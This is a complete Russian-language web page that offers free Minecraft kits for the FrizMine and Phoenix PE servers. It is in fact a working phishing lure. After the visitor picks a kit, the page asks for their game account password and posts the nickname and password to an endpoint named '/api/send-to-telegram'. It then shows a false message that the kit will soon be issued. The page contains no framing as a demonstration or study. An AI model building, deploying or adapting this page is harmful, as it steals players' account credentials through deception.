<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Kits Minecraft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* Водяной знак на фоне */
        body::before {
            content: "Free Kits Minecraft Server";
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 5vw;
            color: rgba(0, 0, 0, 0.03);
            white-space: nowrap;
            pointer-events: none;
            z-index: 0;
            font-weight: bold;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 480px;
            padding: 30px;
            position: relative;
            z-index: 1;
        }

        h1 {
            font-size: 24px;
            color: #1a1a1a;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
        }

        h2 {
            font-size: 18px;
            color: #666;
            margin-bottom: 15px;
            font-weight: 500;
        }

        .step {
            display: none;
        }

        .step.active {
            display: block;
        }

        .server-select {
            display: flex;
            gap: 12px;
            margin-bottom: 10px;
        }

        .server-btn, .kit-btn {
            flex: 1;
            padding: 14px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            transition: all 0.2s;
        }

        .server-btn:hover, .kit-btn:hover {
            border-color: #2196F3;
            background: #f5f9ff;
        }

        .server-btn.selected, .kit-btn.selected {
            background: #2196F3;
            color: white;
            border-color: #2196F3;
        }

        .kits-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }

        .info-box {
            background: #f8f9fa;
            border-left: 4px solid #2196F3;
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #555;
        }

        .info-box strong {
            color: #2196F3;
            display: block;
            margin-bottom: 4px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px 14px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #2196F3;
        }

        input::placeholder {
            color: #999;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }

        .submit-btn:hover {
            background: #1976D2;
        }

        .message {
            margin-top: 16px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
        }

        .message.show {
            display: block;
        }

        .message.success {
            background: #e8f5e8;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }

        .message.error {
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }

        .back-btn {
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 14px;
            padding: 8px 0;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .back-btn:hover {
            color: #2196F3;
        }

        .back-btn::before {
            content: "←";
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free Kits Minecraft Server</h1>

        <!-- ШАГ 1: Выбор сервера -->
        <div id="step1" class="step active">
            <h2>Выберите сервер:</h2>
            <div class="server-select">
                <button class="server-btn" onclick="selectServer('frizmine')">FrizMine</button>
                <button class="server-btn" onclick="selectServer('phoenix')">Phoenix PE</button>
            </div>
        </div>

        <!-- ШАГ 2: Выбор кита -->
        <div id="step2" class="step">
            <button class="back-btn" onclick="goToStep1()">Назад к серверам</button>
            <div class="info-box" id="selectedServerInfo">
                <strong>Выбран сервер:</strong> <span id="serverNameDisplay"></span>
            </div>
            <h2>Доступные киты:</h2>
            <div class="kits-grid" id="kitsContainer"></div>
        </div>

        <!-- ШАГ 3: Форма подтверждения -->
        <div id="step3" class="step">
            <button class="back-btn" onclick="goToStep2()">Назад к китам</button>
            <div class="info-box">
                <strong>Ваш выбор:</strong>
                <span id="finalChoiceDisplay"></span>
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label>Никнейм в Minecraft:</label>
                    <input type="text" id="username" required placeholder="Введите ваш ник">
                </div>
                
                <div class="form-group">
                    <label>Пароль от аккаунта:</label>
                    <input type="password" id="password" required placeholder="Введите пароль">
                </div>
                
                <button type="submit" class="submit-btn">Подтвердить и получить кит</button>
            </form>
            
            <div id="message" class="message"></div>
        </div>
    </div>

    <script>
        let selectedServer = '';
        let selectedKit = '';

        const kits = {
            'frizmine': [
                { name: 'Кит Магистра', id: 'master' },
                { name: 'Кит Принца', id: 'prince' },
                { name: 'Кит Легенды', id: 'legend' }
            ],
            'phoenix': [
                { name: 'Кит Князя', id: 'knyaz' },
                { name: 'Кит Принца', id: 'prince' },
                { name: 'Кит Ютуб', id: 'youtube' }
            ]
        };

        const serverNames = {
            'frizmine': 'FrizMine',
            'phoenix': 'Phoenix PE'
        };

        function selectServer(server) {
            selectedServer = server;
            selectedKit = '';
            
            // Убираем выделение у всех кнопок серверов
            document.querySelectorAll('.server-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            // Выделяем нажатую кнопку
            event.target.classList.add('selected');
            
            // Показываем следующий шаг
            showKits();
        }

        function showKits() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            document.getElementById('step3').classList.remove('active');
            
            // Обновляем информацию о сервере
            document.getElementById('serverNameDisplay').textContent = serverNames[selectedServer];
            
            // Создаем кнопки китов
            const kitsContainer = document.getElementById('kitsContainer');
            kitsContainer.innerHTML = '';
            
            kits[selectedServer].forEach(kit => {
                const button = document.createElement('button');
                button.className = 'kit-btn';
                button.textContent = kit.name;
                button.onclick = () => selectKit(kit.name);
                kitsContainer.appendChild(button);
            });
        }

        function selectKit(kitName) {
            selectedKit = kitName;
            
            // Убираем выделение у всех кнопок китов
            document.querySelectorAll('.kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            // Выделяем нажатую кнопку
            event.target.classList.add('selected');
            
            // Показываем форму
            showForm();
        }

        function showForm() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
            
            // Обновляем информацию о выборе
            document.getElementById('finalChoiceDisplay').innerHTML = 
                `Сервер: <strong>${serverNames[selectedServer]}</strong>, Кит: <strong>${selectedKit}</strong>`;
        }

        function goToStep1() {
            selectedServer = '';
            selectedKit = '';
            
            document.getElementById('step1').classList.add('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.remove('active');
            
            // Убираем выделение со всех кнопок
            document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
        }

        function goToStep2() {
            selectedKit = '';
            
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            document.getElementById('step3').classList.remove('active');
            
            // Убираем выделение с китов
            document.querySelectorAll('.kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
        }

        // Обработка отправки формы
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            if (!username || !password) {
                messageDiv.textContent = 'Заполните все поля!';
                messageDiv.className = 'message error show';
                return;
            }

            messageDiv.textContent = 'Отправка...';
            messageDiv.className = 'message show';
            messageDiv.style.color = '#666';

            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username, 
                        password,
                        server: serverNames[selectedServer],
                        kit: selectedKit
                    })
                });

                const result = await response.json();

                if (result.success) {
                    messageDiv.textContent = '✓ Ура! Спасибо что выбрали нас! Кит скоро будет выдан!';
                    messageDiv.className = 'message success show';
                    
                    // Очищаем форму
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                    
                    // Возвращаемся к началу через 3 секунды
                    setTimeout(() => {
                        goToStep1();
                        messageDiv.className = 'message';
                    }, 3000);
                } else {
                    messageDiv.textContent = '✗ Ошибка отправки. Попробуйте позже.';
                    messageDiv.className = 'message error show';
                }
            } catch (error) {
                messageDiv.textContent = '✗ Ошибка соединения. Проверьте интернет.';
                messageDiv.className = 'message error show';
            }
        });
    </script>
</body>
</html>
